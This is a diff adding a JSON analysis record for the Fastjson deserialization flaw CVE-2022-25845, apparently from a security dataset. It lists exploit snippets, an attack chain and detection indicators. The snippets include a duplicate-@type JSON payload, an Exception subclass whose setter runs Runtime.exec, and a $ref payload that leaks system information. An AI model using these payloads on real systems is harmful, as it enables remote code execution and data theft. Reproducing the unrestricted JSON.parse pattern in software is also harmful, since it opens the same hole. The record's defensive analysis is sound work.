@@ -1,0 +1,148 @@
+{
+  "package_info": {
+    "package_name": "fastjson",
+    "package_manager": "maven",
+    "package_versions": "1.2.80 and earlier",
+    "why_malicious": "The package contains a critical deserialization vulnerability (CVE-2022-25845) that allows attackers to bypass the AutoTypeCheck mechanism and instantiate arbitrary classes extending Throwable during deserialization. This enables remote code execution or information disclosure if a suitable gadget class is present and attacker-controlled JSON input is processed without class restrictions."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when user-controlled JSON is deserialized)",
+        "file_location": "Java application code using JSON.parseObject(String str) or JSON.parse(String str)",
+        "required_permissions": [
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "UserClass userClass = (UserClass) JSON.parse(jsonInput);",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code deserializes user-controlled JSON input using JSON.parse without specifying a target class, allowing attacker-supplied @type fields to control object instantiation, which can result in arbitrary class loading and execution of attacker-controlled code.",
+      "malice_analysis": {
+        "why_suspicious": "Deserializing untrusted input without constraining the target class allows attackers to specify arbitrary classes via the @type field, leading to deserialization of dangerous or malicious classes.",
+        "violated_expectations": "Normal usage should restrict deserialization to known, safe classes. Here, the code allows arbitrary class instantiation based on user input, violating secure deserialization practices.",
+        "similar_legitimate_use": "Dynamic deserialization for plugin systems or polymorphic data, but only with strict type whitelisting and input validation.",
+        "key_indicators": [
+          "Use of JSON.parseObject(String str) or JSON.parse(String str) with untrusted input",
+          "No second argument specifying a target class",
+          "User-controlled @type field in JSON enabling arbitrary class instantiation"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (during deserialization of attacker-supplied JSON)",
+        "file_location": "Attacker-supplied JSON payload",
+        "required_permissions": [
+          "process_execution"
+        ]
+      },
+      "code_snippet": "{\n  \"@type\": \"java.lang.Exception\",\n  \"@type\": \"com.example.fastjson.poc20220523.Poc20220523\",\n  \"name\": \"calc\"\n}",
+      "code_language": "json",
+      "code_behavior": "At runtime, the attacker-supplied JSON payload is deserialized, specifying a custom Exception-derived class with a setter method that executes arbitrary OS commands, resulting in remote code execution on the target system.",
+      "malice_analysis": {
+        "why_suspicious": "The payload leverages the @type field to instantiate a class with a malicious setter, exploiting the deserialization process to achieve arbitrary code execution.",
+        "violated_expectations": "Deserialization should not allow instantiation of attacker-controlled classes or invocation of arbitrary methods with untrusted data.",
+        "similar_legitimate_use": "Polymorphic deserialization in trusted environments with strict type controls and input validation.",
+        "key_indicators": [
+          "Multiple @type fields in JSON payload",
+          "Targeting custom Exception/Throwable-derived classes",
+          "Setter method with side effects such as Runtime.getRuntime().exec"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (during deserialization of attacker-supplied JSON)",
+        "file_location": "Java class definition in application code",
+        "required_permissions": [
+          "process_execution"
+        ]
+      },
+      "code_snippet": "public class Poc20220523 extends Exception {\n    public void setName(String str) {\n        try {\n            Runtime.getRuntime().exec(str);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
+      "code_language": "java",
+      "code_behavior": "At runtime, when the class is instantiated via deserialization, the setName method is invoked with attacker-controlled data, resulting in execution of arbitrary system commands.",
+      "malice_analysis": {
+        "why_suspicious": "Including a setter that executes system commands based on external input is a classic deserialization gadget pattern and enables remote code execution.",
+        "violated_expectations": "Setters should not have side effects like command execution, especially in Exception-derived classes intended for error handling.",
+        "similar_legitimate_use": "No legitimate use; this is a textbook example of a deserialization gadget designed for exploitation.",
+        "key_indicators": [
+          "Exception-derived class with setter invoking Runtime.getRuntime().exec",
+          "Setter method with side effects triggered by deserialization",
+          "Class available on application classpath"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (during deserialization of attacker-supplied JSON)",
+        "file_location": "Attacker-supplied JSON payload (data leakage example)",
+        "required_permissions": [
+          "none (information disclosure)"
+        ]
+      },
+      "code_snippet": "{\n  \"x\":{\n    \"@type\":\"java.lang.Exception\",\n    \"@type\":\"org.openqa.selenium.WebDriverException\"\n  },\n  \"y\":{\n    \"$ref\":\"$x.systemInformation\"\n  }\n}",
+      "code_language": "json",
+      "code_behavior": "At runtime, the JSON payload instantiates a known Exception-derived class (WebDriverException) and uses a $ref to access its systemInformation property, causing sensitive system information to be leaked in the deserialized output.",
+      "malice_analysis": {
+        "why_suspicious": "The payload abuses deserialization to extract and leak system information via a known gadget class, exploiting object references and property access.",
+        "violated_expectations": "Deserialization should not allow access to internal object properties or cause information leakage through object references.",
+        "similar_legitimate_use": "None; this is a targeted information disclosure attack using deserialization gadgets.",
+        "key_indicators": [
+          "Use of $ref to access internal object properties in JSON",
+          "Targeting known Exception-derived gadget classes with sensitive properties"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits a malicious JSON payload containing @type fields that target a Throwable-derived class, optionally including multiple @type fields to specify a custom gadget class.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_4"
+      ],
+      "leads_to": "Deserialization process in the vulnerable application is triggered with attacker-controlled input"
+    },
+    {
+      "step": 2,
+      "action": "Application code calls JSON.parseObject or JSON.parse with user-controlled input and no target class restriction, allowing the Fastjson engine to process the @type fields.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Fastjson deserialization engine interprets @type and instantiates the attacker-specified class"
+    },
+    {
+      "step": 3,
+      "action": "Fastjson instantiates the specified Throwable-derived class and invokes setter methods with attacker-controlled data, leading to code execution or information disclosure depending on the gadget class used.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Execution of arbitrary code or leakage of sensitive information, completing the attack"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Deserialization of user-controlled JSON via JSON.parse or JSON.parseObject without specifying a target class",
+      "Presence of @type fields in incoming JSON data, especially multiple or nested @type fields",
+      "Instantiation of Throwable-derived classes during deserialization",
+      "Invocation of setter methods with external input during deserialization",
+      "Use of $ref in JSON to access internal object properties"
+    ],
+    "file_indicators": [
+      "Application code using JSON.parseObject(String str) or JSON.parse(String str) with untrusted input and no target class argument",
+      "Custom Exception/Throwable-derived classes with setters performing dangerous actions such as process execution",
+      "Presence of known gadget classes (e.g., org.openqa.selenium.WebDriverException) on the classpath"
+    ],
+    "network_indicators": [
+      "Inbound HTTP requests containing JSON payloads with @type fields targeting Exception or custom classes",
+      "Outbound network connections or process execution events following deserialization of JSON input"
+    ],
+    "how_to_detect": "Monitor application code for use of JSON.parse or JSON.parseObject with untrusted input and without a target class restriction. Inspect incoming JSON payloads for @type fields, especially those referencing Throwable-derived or known gadget classes. Flag custom Exception/Throwable-derived classes with setters that perform side effects (e.g., process execution) using static code analysis. Monitor for use of $ref in JSON to access internal object properties. Use dynamic monitoring to detect suspicious class instantiation, command execution, or information leakage during deserialization events."
+  }
+}
